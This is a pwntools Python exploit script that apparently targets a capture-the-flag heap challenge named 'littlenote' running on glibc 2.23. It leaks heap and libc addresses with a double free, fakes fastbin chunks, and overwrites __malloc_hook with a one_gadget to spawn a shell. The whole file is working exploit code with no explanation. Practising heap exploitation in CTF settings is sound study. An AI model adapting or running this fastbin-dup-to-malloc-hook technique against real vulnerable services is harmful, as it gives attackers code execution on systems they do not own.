#! /usr/bin/python

from pwn import *
from LibcSearcher import *

p = process('./littlenote')
elf = ELF('./littlenote')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
#context.log_level = 'debug'

def add(cont,choice):
    p.recvuntil('Your choice:')
    p.sendline('1')
    p.recvuntil('note')
    p.send(cont)
    p.recvuntil('?')
    p.sendline(choice)

def show(idx):
    p.recvuntil('Your choice:')
    p.sendline('2')
    p.recvuntil('?')
    p.sendline(str(idx))

def delete(idx):
    p.recvuntil('Your choice:')
    p.sendline('3')
    p.recvuntil('?')
    p.sendline(str(idx))

###leak heap###
add('leakaaaa','Y')#0
add('leakbbbb','Y')#1
add('leakcccc','Y')#2
add('leakdddd','Y')#3
add('leakeeee','Y')#4

delete(1)
delete(2)

show(2)
p.recv()
heap = u64(p.recvuntil('\n')[:-1].ljust(8,'\x00')) - 0x70
log.success('heap:'+hex(heap))

###leak libc###
delete(1)
fake_chunk = heap + 0x0e0 + 0x30 + 0x10
over_chunk = heap + 0x150

add(p64(fake_chunk),'Y')#chunk1 5


payload = 'A' * 0x30 + p64(0) + p64(0x7f)
add(payload,'Y')#overflow 2 6


add('Nothing','Y')#1 7

payload = 'B' * 0x20 + p64(0) + p64(0xe1)
add(payload,'Y')#fake_chunk to overflow
delete(3)
show(3)

offset = 0x7f2f41f79b78 - 0x7f2f41bb5000
libc_base = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')) - 88 - 0x3c4b20
log.success('libc:'+hex(libc_base))

###get shell###
malloc_hook = libc_base + libc.symbols['__malloc_hook']
fake_chunk = malloc_hook - 0x23
one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]
one_gadget = libc_base + one_gadget[2]

delete(1)
delete(2)
delete(1)

add(p64(fake_chunk),'Y')
add('get shell','Y')
add('get shell','Y')

payload = 'A' * 0x13 + p64(one_gadget)
add(payload,'Y')
###get shell###
p.interactive()
